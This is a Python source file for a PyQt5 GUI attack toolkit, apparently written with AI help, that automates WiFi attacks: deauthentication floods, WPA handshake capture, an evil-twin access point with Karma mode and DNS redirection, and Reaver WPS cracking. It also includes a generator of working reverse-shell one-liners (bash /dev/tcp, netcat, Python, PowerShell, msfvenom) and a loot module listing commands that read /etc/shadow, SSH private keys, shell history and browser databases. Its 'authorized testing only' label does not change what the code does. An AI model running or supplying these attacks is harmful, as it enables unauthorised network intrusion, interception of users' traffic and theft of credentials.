#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Wireless GUI Pwn Toolkit - AWGPT v4.0
Advanced WiFi Penetration Testing with Post-Exploitation Capabilities

Features:
- Modular architecture (all features optional)
- Rich terminal outputs for network recon
- Complete WiFi attack scenarios
- Post-exploitation (reverse shells, loot, nmap)
- Context-aware activation (only when on same network)

Author: OHDAMNBRO WITH AI
License: Educational Use Only
⚠️ AUTHORIZED PENETRATION TESTING ONLY!
"""

import os
import sys
import subprocess
import threading
import json
import re
import time
import signal
import socket
import struct
import logging
import ipaddress
import xml.etree.ElementTree as ET
from datetime import datetime
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from enum import Enum
from functools import lru_cache

# PyQt5 Imports
try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QTabWidget, QTableWidget, QTableWidgetItem, QPushButton, QComboBox,
        QLineEdit, QLabel, QTextEdit, QSplitter, QStatusBar, QProgressBar,
        QCheckBox, QSpinBox, QDialog, QFormLayout, QDialogButtonBox,
        QMessageBox, QFileDialog, QGroupBox, QGridLayout, QListWidget,
        QListWidgetItem, QHeaderView, QFrame, QScrollArea, QStyleFactory,
        QSizePolicy, QMenuBar, QMenu, QTreeWidget, QTreeWidgetItem,
        QSystemTrayIcon, QStyledItemDelegate, QAbstractItemView, QTextBrowser,
        QRadioButton, QButtonGroup, QSlider, QTabBar, QDockWidget, QToolBar,
        QAction, QShortcut, QTreeWidgetItemIterator, QStackedWidget,
        QFrame, QSplitter, QScrollBar
    )
    from PyQt5.QtCore import (
        Qt, QThread, pyqtSignal, QTimer, QProcess, QSize, QRect,
        QMutex, QMutexLocker, QWaitCondition, QObject, QEvent, QPropertyAnimation,
        QTime, QDir, QIODevice, QTextStream, QProcessEnvironment
    )
    from PyQt5.QtGui import (
        QColor, QFont, QIcon, QTextCursor, QPixmap, QBrush,
        QTextCharFormat, QPainter, QPen, QKeySequence, QPalette,
        QSyntaxHighlighter, QTextFormat
    )
except ImportError as e:
    print(f"PyQt5 import error: {e}")
    print("Install: pip install PyQt5")
    sys.exit(1)

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

APP_NAME = "Aegis WiFi Framework"
APP_VERSION = "4.0"
AUTHOR = "Aegis Security Team"

# Module Registry - All features can be enabled/disabled
MODULE_REGISTRY = {
    'wifi_recon': True,
    'evil_twin': True,
    'handshake': True,
    'wps': True,
    'krack': True,
    'captive_portal': True,
    'post_exploit': True,
    'reverse_shells': True,
    'loot': True,
    'nmap': True,
    'manual_builder': True
}

# Color Scheme
COLORS = {
    'background': '#0d1117',
    'surface': '#161b22',
    'surface_alt': '#21262d',
    'border': '#30363d',
    'primary': '#58a6ff',
    'accent': '#3fb950',
    'danger': '#f85149',
    'warning': '#d29922',
    'text': '#c9d1d9',
    'text_dim': '#8b949e',
    'terminal_bg': '#0d1117',
    'terminal_text': '#39d353',
    'success': '#3fb950',
    'error': '#f85149',
    'cyan': '#79c0ff',
    'magenta': '#d2a8ff',
    'yellow': '#e3b341',
}

# Logging Setup
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/aegis_wifi.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ============================================================================
# DATA CLASSES
# ============================================================================

class InterfaceMode(Enum):
    MANAGED = "managed"
    MONITOR = "monitor"
    AP = "ap"
    UNKNOWN = "unknown"


class InterfaceStatus(Enum):
    UP = "up"
    DOWN = "down"
    CONNECTED = "connected"
    DISCONNECTED = "disconnected"
    UNKNOWN = "unknown"


@dataclass
class WiFiNetwork:
    """Complete WiFi network information"""
    bssid: str
    ssid: str
    channel: int
    signal: int
    security: str
    manufacturer: str = ""
    wps: str = "Unknown"
    clients: int = 0
    last_seen: float = field(default_factory=time.time)
    encryption: str = ""
    auth: str = ""
    handshake_m1: bool = False
    handshake_m2: bool = False
    handshake_m3: bool = False
    handshake_m4: bool = False
    pmkid: bool = False
    hidden: bool = False
    beacon: int = 0
    data_frames: int = 0


@dataclass
class WiFiClient:
    """Connected WiFi client"""
    mac: str
    bssid: str
    signal: int
    packets: int = 0
    manufacturer: str = ""
    probe_requests: List[str] = field(default_factory=list)


@dataclass
class NetworkInterface:
    """Network interface information"""
    name: str
    status: InterfaceStatus
    mode: InterfaceMode
    mac_address: str = ""
    ip_address: str = ""
    netmask: str = ""
    gateway: str = ""
    driver: str = ""
    chipset: str = ""
    frequency: str = ""


@dataclass
class NmapHost:
    """Nmap scan result host"""
    ip: str
    status: str = "unknown"
    hostname: str = ""
    mac: str = ""
    vendor: str = ""
    os: str = ""
    ports: List[Dict] = field(default_factory=list)
    services: List[Dict] = field(default_factory=list)
    scripts: List[Dict] = field(default_factory=list)


@dataclass
class CapturedLoot:
    """Post-exploitation loot"""
    target: str
    loot_type: str
    content: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    file_path: str = ""


# ============================================================================
# MODULE MANAGER
# ============================================================================

class ModuleManager:
    """Manages optional modules - enable/disable at runtime"""

    def __init__(self):
        self.modules = MODULE_REGISTRY.copy()
        self.loaded_modules = {}

    def is_enabled(self, module_name: str) -> bool:
        return self.modules.get(module_name, False)

    def enable(self, module_name: str):
        self.modules[module_name] = True
        logger.info(f"Module enabled: {module_name}")

    def disable(self, module_name: str):
        self.modules[module_name] = False
        logger.info(f"Module disabled: {module_name}")

    def toggle(self, module_name: str) -> bool:
        self.modules[module_name] = not self.modules[module_name]
        return self.modules[module_name]

    def get_enabled_modules(self) -> List[str]:
        return [k for k, v in self.modules.items() if v]

    def get_disabled_modules(self) -> List[str]:
        return [k for k, v in self.modules.items() if not v]


# ============================================================================
# NETWORK RECON THREADS
# ============================================================================

class NetworkScanner(QThread):
    """Advanced WiFi network scanner with complete information"""
    network_found = pyqtSignal(object)
    networks_updated = pyqtSignal(list)
    scan_status = pyqtSignal(str)
    error_occurred = pyqtSignal(str)
    client_found = pyqtSignal(object)
    handshake_detected = pyqtSignal(str, dict)

    def __init__(self, interface: str):
        super().__init__()
        self.interface = interface
        self.running = False
        self.networks: Dict[str, WiFiNetwork] = {}
        self.clients: Dict[str, WiFiClient] = {}
        self.scan_lock = QMutex()
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._run_airodump_ng()
        except Exception as e:
            logger.error(f"Scanner error: {e}")
            self.error_occurred.emit(f"Scan error: {str(e)}")

    def _run_airodump_ng(self):
        """Run airodump-ng with comprehensive CSV output"""
        self.scan_status.emit(f"Starting scan on {self.interface}...")

        tmp_file = f"/tmp/aegis_scan_{int(time.time())}"

        # Use airodump-ng with all output options
        cmd = ["sudo", "airodump-ng",
               "--output-format", "csv",
               "-w", tmp_file,
               "--manufacturer",  # Include manufacturer
               "--uptime",       # Include uptime
               "--wps",          # Include WPS info
               self.interface]

        logger.info(f"Starting airodump-ng: {' '.join(cmd)}")

        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      universal_newlines=True, bufsize=1)

        csv_file = f"{tmp_file}-01.csv"
        last_size = 0

        while self.running:
            try:
                if self.process.poll() is not None:
                    break

                if os.path.exists(csv_file):
                    current_size = os.path.getsize(csv_file)
                    if current_size > last_size:
                        try:
                            with open(csv_file, 'r', errors='ignore') as f:
                                content = f.read()
                                self._parse_csv_output(content)
                            last_size = current_size
                        except IOError:
                            pass
            except Exception as e:
                logger.error(f"Scan error: {e}")

            time.sleep(1)

        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                try:
                    self.process.kill()
                except:
                    pass

        self.scan_status.emit("Scan stopped")

    def _parse_csv_output(self, content: str):
        """Parse airodump-ng CSV with all fields"""
        lines = content.strip().split('\n')
        in_clients = False

        for line in lines:
            line = line.strip()

            if not line or 'Station MAC' in line:
                in_clients = True
                continue

            if ',' not in line:
                continue

            try:
                parts = [p.strip() for p in line.split(',')]

                # Network/AP parsing
                if not in_clients:
                    if len(parts) < 14 or not parts[0] or parts[0] == 'BSSID':
                        continue

                    bssid = parts[0]
                    if not bssid or bssid.count(':') != 5:
                        continue

                    # Parse all available information
                    signal = int(parts[2]) if parts[2].strip() and parts[2].strip().lstrip('-').isdigit() else -100
                    channel = int(parts[3]) if parts[3].strip() and parts[3].strip().isdigit() else 0
                    auth = parts[6].strip() if len(parts) > 6 else ""
                    wps = parts[10].strip() if len(parts) > 10 else ""

                    # Manufacturer from airodump (if available)
                    manufacturer = ""
                    if len(parts) > 9 and parts[9].strip():
                        manufacturer = parts[9].strip()

                    ssid = parts[13].strip() if len(parts) > 13 else "[Hidden]"

                    network = WiFiNetwork(
                        bssid=bssid,
                        ssid=ssid,
                        channel=channel,
                        signal=signal,
                        security=parts[5].strip() if len(parts) > 5 else "Open",
                        manufacturer=manufacturer or self._get_manufacturer(bssid),
                        wps=wps,
                        auth=auth,
                        encryption=parts[4].strip() if len(parts) > 4 else "",
                        hidden=ssid == "[Hidden]" or ssid == "",
                        beacon=int(parts[8]) if len(parts) > 8 and parts[8].strip().isdigit() else 0
                    )

                    with QMutexLocker(self.scan_lock):
                        self.networks[bssid] = network

                    self.network_found.emit(network)

                # Client parsing
                else:
                    if len(parts) < 7:
                        continue

                    client_mac = parts[0]
                    if not client_mac or client_mac.count(':') != 5:
                        continue

                    bssid = parts[5].strip() if len(parts) > 5 else "Not Associated"
                    signal = int(parts[3]) if len(parts) > 3 and parts[3].strip() and parts[3].strip().lstrip('-').isdigit() else -100

                    client = WiFiClient(
                        mac=client_mac,
                        bssid=bssid,
                        signal=signal,
                        manufacturer=self._get_manufacturer(client_mac)
                    )

                    with QMutexLocker(self.scan_lock):
                        self.clients[client_mac] = client

                        # Update network client count
                        if bssid in self.networks:
                            self.networks[bssid].clients += 1

                    self.client_found.emit(client)

            except Exception as e:
                logger.debug(f"Parse error: {e}")
                continue

        with QMutexLocker(self.scan_lock):
            self.networks_updated.emit(list(self.networks.values()))

    @lru_cache(maxsize=256)
    def _get_manufacturer(self, bssid: str) -> str:
        """Get manufacturer from MAC prefix"""
        try:
            mac_prefix = bssid[:8].replace(':', '').upper()
            result = subprocess.run(["macchanger", "-l"], capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if mac_prefix in line.upper():
                        parts = line.split('\t')
                        if len(parts) > 1:
                            return parts[-1].strip()[:30]
        except:
            pass
        return "Unknown"

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                try:
                    self.process.kill()
                except:
                    pass


class NmapScanner(QThread):
    """Nmap port scanner with comprehensive output"""
    scan_progress = pyqtSignal(str)
    host_found = pyqtSignal(object)
    scan_complete = pyqtSignal(list)
    error_occurred = pyqtSignal(str)

    def __init__(self, target: str, scan_type: str = "quick", ports: str = ""):
        super().__init__()
        self.target = target
        self.scan_type = scan_type
        self.ports = ports
        self.running = False
        self.hosts: List[NmapHost] = []
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._run_nmap()
        except Exception as e:
            logger.error(f"Nmap error: {e}")
            self.error_occurred.emit(str(e))

    def _run_nmap(self):
        """Run nmap with specified parameters"""
        # Build nmap arguments based on scan type
        nmap_args = {
            'quick': '-sn -T4',
            'stealth': '-sS -T2 -f',
            'full': '-sV -sC -O -T4',
            'vuln': '-sV --script=vuln -T4',
            'quick_ports': '-sT -T4 -p 22,80,443,445,3389,8080',
            'custom': ''
        }

        args = nmap_args.get(self.scan_type, nmap_args['quick'])
        if self.ports:
            args = f"-p {self.ports} -sV -sC"

        cmd = f"sudo nmap {args} -oX - {self.target}".split()

        self.scan_progress.emit(f"Running: {' '.join(cmd)}")

        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       universal_newlines=True)

        # Parse XML output
        output, _ = self.process.communicate()

        try:
            root = ET.fromstring(output)
            for host_elem in root.findall('.//host'):
                host = self._parse_host(host_elem)
                if host:
                    self.hosts.append(host)
                    self.host_found.emit(host)

            self.scan_complete.emit(self.hosts)

        except ET.ParseError as e:
            self.error_occurred.emit(f"XML parse error: {e}")

    def _parse_host(self, host_elem) -> Optional[NmapHost]:
        """Parse nmap XML host element"""
        try:
            # Get IP
            address = host_elem.find('.//address[@addrtype="ipv4"]')
            if address is None:
                address = host_elem.find('.//address[@addrtype="ipv6"]')
            if address is None:
                return None

            ip = address.get('addr', '')

            # Get status
            status_elem = host_elem.find('status')
            status = status_elem.get('state', 'unknown') if status_elem is not None else 'unknown'

            # Get hostname
            hostnames = host_elem.find('.//hostnames')
            hostname = ""
            if hostnames is not None:
                hostname_elem = hostnames.find('.//hostname')
                if hostname_elem is not None:
                    hostname = hostname_elem.get('name', '')

            # Get MAC and vendor
            mac_elem = host_elem.find('.//address[@addrtype="mac"]')
            mac = mac_elem.get('addr', '') if mac_elem is not None else ''
            vendor = mac_elem.get('vendor', '') if mac_elem is not None else ''

            # Get ports
            ports = []
            for port_elem in host_elem.findall('.//port'):
                port_id = port_elem.get('portid')
                protocol = port_elem.get('protocol', 'tcp')

                state_elem = port_elem.find('state')
                state = state_elem.get('state', 'unknown') if state_elem is not None else 'unknown'

                service_elem = port_elem.find('service')
                service_name = service_elem.get('name', '') if service_elem is not None else ''
                product = service_elem.get('product', '') if service_elem is not None else ''
                version = service_elem.get('version', '') if service_elem is not None else ''

                ports.append({
                    'port': port_id,
                    'protocol': protocol,
                    'state': state,
                    'service': service_name,
                    'product': product,
                    'version': version
                })

            return NmapHost(
                ip=ip,
                status=status,
                hostname=hostname,
                mac=mac,
                vendor=vendor,
                ports=ports
            )

        except Exception as e:
            logger.debug(f"Host parse error: {e}")
            return None

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass


# ============================================================================
# ATTACK MODULES
# ============================================================================

class DeauthAttack(QThread):
    """Deauthentication attack with multiple targets"""
    status_changed = pyqtSignal(str)
    packets_sent = pyqtSignal(int)
    attack_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                 channel: int = 1, count: int = 0):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.client_mac = client_mac
        self.channel = channel
        self.count = count
        self.running = False
        self.sent = 0

    def run(self):
        self.running = True
        try:
            while self.running:
                if self.count > 0 and self.sent >= self.count:
                    break

                cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", self.bssid]
                if self.client_mac != "FF:FF:FF:FF:FF:FF":
                    cmd.extend(["-c", self.client_mac])
                cmd.append(self.interface)

                subprocess.run(cmd, capture_output=True)
                self.sent += 10
                self.packets_sent.emit(self.sent)
                time.sleep(1)

        finally:
            self.attack_stopped.emit()

    def stop(self):
        self.running = False


class HandshakeCapture(QThread):
    """WPA Handshake capture with M1-M4 detection"""
    handshake_captured = pyqtSignal(str, dict)
    status_changed = pyqtSignal(str)
    capture_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, ssid: str, channel: int = 1,
                 output_file: str = "/tmp/handshake"):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.output_file = output_file
        self.running = False
        self.handshake_data = {'m1': False, 'm2': False, 'm3': False, 'm4': False}
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            self._capture_handshake()
        finally:
            self.capture_stopped.emit()

    def _capture_handshake(self):
        self.status_changed.emit(f"[*] Starting handshake capture on {self.ssid}")

        # Start airodump for capture
        cmd = ["sudo", "airodump-ng", "--bssid", self.bssid, "--channel", str(self.channel),
               "-w", self.output_file, "--output-format", "pcap", self.interface]

        self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      universal_newlines=True)

        # Monitor for handshake
        while self.running:
            cap_file = f"{self.output_file}-01.cap"
            if os.path.exists(cap_file):
                # Check for handshake using pyrit or hcxpcapngtool
                result = subprocess.run(["sudo", "pyrit", "-r", cap_file, "analyze"],
                                      capture_output=True, text=True)

                output = result.stdout.lower()

                # Detect which messages were captured
                self.handshake_data['m1'] = "message 1" in output or "m1" in output
                self.handshake_data['m2'] = "message 2" in output or "m2" in output
                self.handshake_data['m3'] = "message 3" in output or "m3" in output
                self.handshake_data['m4'] = "message 4" in output or "m4" in output

                # Check if we have a complete handshake
                if (self.handshake_data['m1'] and self.handshake_data['m2'] and
                    self.handshake_data['m3']) or self.handshake_data['m4']:
                    self.handshake_captured.emit(cap_file, self.handshake_data)
                    self.status_changed.emit("[+] Complete handshake captured!")
                    break

            time.sleep(5)

        if self.process:
            try:
                self.process.terminate()
            except:
                pass

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass


class EvilTwinWorker(QThread):
    """Evil Twin AP with Karma/Mana support"""
    status_changed = pyqtSignal(str)
    client_connected = pyqtSignal(str)
    attack_started = pyqtSignal()
    attack_stopped = pyqtSignal()

    def __init__(self, ssid: str, interface: str, bssid: str = "", channel: int = 6,
                 karma_mode: bool = False, mana_mode: bool = False,
                 open_network: bool = True, password: str = ""):
        super().__init__()
        self.ssid = ssid
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.karma_mode = karma_mode
        self.mana_mode = mana_mode
        self.open_network = open_network
        self.password = password
        self.running = False
        self.processes: List[subprocess.Popen] = []

    def run(self):
        self.running = True
        try:
            self._setup_evil_twin()
        except Exception as e:
            logger.error(f"Evil Twin error: {e}")
            self.status_changed.emit(f"[!] Error: {e}")
        finally:
            self.attack_stopped.emit()

    def _setup_evil_twin(self):
        self.status_changed.emit(f"[*] Setting up Evil Twin: {self.ssid}")

        # Build hostapd config
        hostapd_config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=1
auth_algs=1
beacon_int=100
dtim_period=2
"""

        if self.karma_mode:
            hostapd_config += "enable_karma=1\n"

        if self.mana_mode:
            hostapd_config += """enable_karma=1
hostapd_enable_full_dynamic_macaddr=1
"""

        if not self.open_network and self.password:
            hostapd_config += f"""wpa=2
wpa_passphrase={self.password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""

        hostapd_conf_file = "/tmp/aegis_hostapd.conf"
        with open(hostapd_conf_file, "w") as f:
            f.write(hostapd_config)

        # Configure network
        subprocess.run(["sudo", "ip", "addr", "flush", self.interface], capture_output=True)
        subprocess.run(["sudo", "ip", "addr", "add", "192.168.100.1/24", "dev", self.interface],
                      capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"], capture_output=True)
        time.sleep(1)

        # Start hostapd
        self.status_changed.emit("[*] Starting hostapd...")
        hostapd = subprocess.Popen(["sudo", "hostapd", hostapd_conf_file],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   universal_newlines=True)
        self.processes.append(hostapd)
        time.sleep(2)

        # Setup dnsmasq
        self.status_changed.emit("[*] Starting DHCP server...")
        dnsmasq_config = f"""interface={self.interface}
dhcp-range=192.168.100.50,192.168.100.200,255.255.255.0,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
listen-address=192.168.100.1
bind-interfaces
log-dhcp
server=1.1.1.1
server=8.8.8.8
address=/#/192.168.100.1
"""

        dnsmasq_conf_file = "/tmp/aegis_dnsmasq.conf"
        with open(dnsmasq_conf_file, "w") as f:
            f.write(dnsmasq_config)

        dnsmasq = subprocess.Popen(["sudo", "dnsmasq", "-C", dnsmasq_conf_file, "-d"],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   universal_newlines=True)
        self.processes.append(dnsmasq)

        self.status_changed.emit("[+] EVIL TWIN ACTIVE")
        self.status_changed.emit(f"[*] SSID: {self.ssid}")
        self.status_changed.emit(f"[*] Channel: {self.channel}")
        self.status_changed.emit(f"[*] Karma: {'ON' if self.karma_mode else 'OFF'}")

        self.attack_started.emit()

        # Monitor for clients
        while self.running:
            time.sleep(2)

    def stop(self):
        self.running = False
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        subprocess.run(["sudo", "killall", "hostapd", "dnsmasq"], capture_output=True)


class WPSAttack(QThread):
    """WPS PIN attack using Reaver"""
    status_changed = pyqtSignal(str)
    pin_progress = pyqtSignal(str)
    wps_success = pyqtSignal(str, str)
    attack_stopped = pyqtSignal()

    def __init__(self, interface: str, bssid: str, channel: int = 1, pixie: bool = True):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.pixie = pixie
        self.running = False
        self.process: Optional[subprocess.Popen] = None

    def run(self):
        self.running = True
        try:
            cmd = ["sudo", "reaver", "-i", self.interface, "-b", self.bssid,
                   "-c", str(self.channel), "-vv", "-S"]

            if self.pixie:
                cmd.append("-K")

            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          universal_newlines=True, bufsize=1)

            for line in self.process.stdout:
                if not self.running:
                    break
                self.status_changed.emit(line.strip())

                if "WPS PIN:" in line:
                    pin = line.split("WPS PIN:")[1].strip().split()[0]
                    self.pin_progress.emit(f"PIN: {pin}")

                if "WPA PSK:" in line:
                    psk = line.split("WPA PSK:")[1].strip().split()[0]
                    self.wps_success.emit(pin, pin)

        finally:
            self.attack_stopped.emit()

    def stop(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
            except:
                pass


# ============================================================================
# POST-EXPLOITATION MODULES
# ============================================================================

class ReverseShellGenerator:
    """Generate various reverse shell payloads"""

    @staticmethod
    def generate_shells(lhost: str, lport: int = 4444) -> Dict[str, str]:
        """Generate multiple reverse shell payloads"""

        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'bash_alt': f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))||exec(\"/bin/sh -i\");'",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'php': f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.new(\"{lhost}\",{lport});exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f.fileno,f.fileno,f.fileno)'",
            'netcat': f"nc -e /bin/sh {lhost} {lport}",
            'netcat_mk': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -gt 0){{;$sendback = (iex $text = [System.Text.Encoding]::ASCII.GetString($bytes,0,$i) 2>&1 | Out-String );$sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback + 'PS ' + (Get-Location).Path + '> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"",
            'msfvenom': f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
            'java': f"r = Runtime.getRuntime();p = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done'] as String[]);p.waitFor()",
        }

        return shells

    @staticmethod
    def get_listener_command(lport: int = 4444) -> Dict[str, str]:
        """Get listener commands for different tools"""

        return {
            'netcat': f"nc -lvnp {lport}",
            'netcat_ssl': f"openssl s_client -connect localhost:{lport} -quiet 2>/dev/null || nc -lvnp {lport}",
            'msf': f"msfconsole -x 'use exploit/multi/handler;set PAYLOAD linux/x64/shell_reverse_tcp;set LHOST 0.0.0.0;set LPORT {lport};run'",
            'socat': f"socat TCP-LISTEN:{lport} STDOUT",
            'rlwrap': f"rlwrap nc -lvnp {lport}",
        }


class LootCollector:
    """Collect loot from compromised systems"""

    @staticmethod
    def get_loot_commands() -> Dict[str, Dict[str, str]]:
        """Get various loot collection commands"""

        return {
            'system_info': {
                'name': 'System Information',
                'commands': [
                    "uname -a",
                    "cat /etc/issue",
                    "cat /etc/os-release",
                    "hostname",
                    "id",
                    "whoami",
                    "w",
                    "last",
                ]
            },
            'network_info': {
                'name': 'Network Information',
                'commands': [
                    "ifconfig -a",
                    "ip addr",
                    "route -n",
                    "cat /etc/resolv.conf",
                    "netstat -tunap",
                    "ss -tunap",
                ]
            },
            'user_files': {
                'name': 'User Files',
                'commands': [
                    "ls -la ~/",
                    "ls -la /home/",
                    "cat ~/.bash_history",
                    "cat ~/.ssh/id_rsa",
                    "cat ~/.ssh/authorized_keys",
                ]
            },
            'passwords': {
                'name': 'Passwords & Credentials',
                'commands': [
                    "cat /etc/passwd",
                    "cat /etc/shadow 2>/dev/null",
                    "grep -r password /etc/ 2>/dev/null",
                    "cat /etc/mysql/my.cnf 2>/dev/null",
                    "cat /etc/httpd/conf/httpd.conf 2>/dev/null",
                ]
            },
            'browser_data': {
                'name': 'Browser Data',
                'commands': [
                    "find ~/.mozilla/firefox -name '*.sqlite' 2>/dev/null",
                    "find ~/.config/google-chrome -name '*.sqlite' 2>/dev/null",
                ]
            },
            'ssh_keys': {
                'name': 'SSH Keys',
                'commands': [
                    "find / -name 'id_rsa' 2>/dev/null",
                    "find / -name 'id_dsa' 2>/dev/null",
                    "find / -name '*.pem' 2>/dev/null",
                ]
            },
            'processes': {
                'name': 'Running Processes',
                'commands': [
                    "ps aux",
                    "ps -ef",
                    "top -bn1",
                ]
            },
            'cron_jobs': {
                'name': 'Cron Jobs',
                'commands': [
                    "cat /etc/crontab",
                    "ls -la /etc/cron.d/",
                    "crontab -l",
                ]
            },
            'sensitive_files': {
                'name': 'Sensitive Files',
                'commands': [
                    "find /etc -perm -4000 2>/dev/null",
                    "find / -name '*.conf' -o -name '*.config' 2>/dev/null | head -20",
                    "cat /etc/sudoers 2>/dev/null",
                ]
            }
        }


class NetworkContextChecker:
    """Check if we're on the same network for post-exploitation"""

    @staticmethod
    def get_local_info() -> Dict[str, str]:
        """Get local network information"""
        info = {
            'ip': 'Unknown',
            'gateway': 'Unknown',
            'netmask': 'Unknown',
            'interface': 'Unknown'
        }

        try:
            # Get default interface and IP
            result = subprocess.run(['ip', 'route', 'show', 'default'],
                                capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts = line.split()
                        if 'via' in parts:
                            info['gateway'] = parts[parts.index('via') + 1]
                        if 'dev' in parts:
                            info['interface'] = parts[parts.index('dev') + 1]

            # Get IP address
            if info['interface'] != 'Unknown':
                result = subprocess.run(['ip', 'addr', 'show', info['interface']],
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'inet ' in line:
                            ip = line.strip().split()[1].split('/')[0]
                            info['ip'] = ip
                            break

        except Exception as e:
            logger.debug(f"Error getting local info: {e}")

        return info

    @staticmethod
    def is_same_network(target_ip: str) -> bool:
        """Check if target IP is on same network"""
        local = NetworkContextChecker.get_local_info()

        if local['ip'] == 'Unknown' or local['gateway'] == 'Unknown':
            return False

        try:
            # Simple check - same subnet
            local_ip = ipaddress.ip_address(local['ip'])
            target = ipaddress.ip_address(target_ip)
            gateway = ipaddress.ip_address(local['gateway'])

            # Assume /24 for simplicity
            local_network = ipaddress.ip_network(f"{local['ip']}/24", False)
            return target in local_network

        except Exception as e:
            logger.debug(f"Network check error: {e}")
            return False

    @staticmethod
    def check_post_exploit_ready(target: str = "") -> Tuple[bool, str]:
        """Check if post-exploitation is ready to use"""
        local = NetworkContextChecker.get_local_info()

        if local['ip'] == 'Unknown':
            return False, "No network connection detected"

        if target:
            if not NetworkContextChecker.is_same_network(target):
                return False, f"Target {target} is not on local network ({local['ip']}/24)"

        return True, f"Ready - Local IP: {local['ip']}, Gateway: {local['gateway']}"


# ============================================================================
# TERMINAL WIDGET
# ============================================================================

class TerminalWidget(QTextEdit):
    """Enhanced terminal widget with colored output"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        self.setStyleSheet(f"""
            QTextEdit {{
                background-color: {COLORS['terminal_bg']};
                color: {COLORS['terminal_text']};
                font-family: 'Courier New', 'DejaVu Sans Mono', monospace;
                font-size: 10pt;
                border: 1px solid {COLORS['border']};
            }}
        """)
        self.append(f"[{datetime.now().strftime('%H:%M:%S')}] Terminal initialized")

    def append_output(self, text: str, color: str = None):
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.End)

        if color:
            format = QTextCharFormat()
            format.setForeground(QColor(color))
            cursor.setCharFormat(format)

        cursor.insertText(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
        self.setTextCursor(cursor)
        self.ensureCursorVisible()

    def append_error(self, text: str):
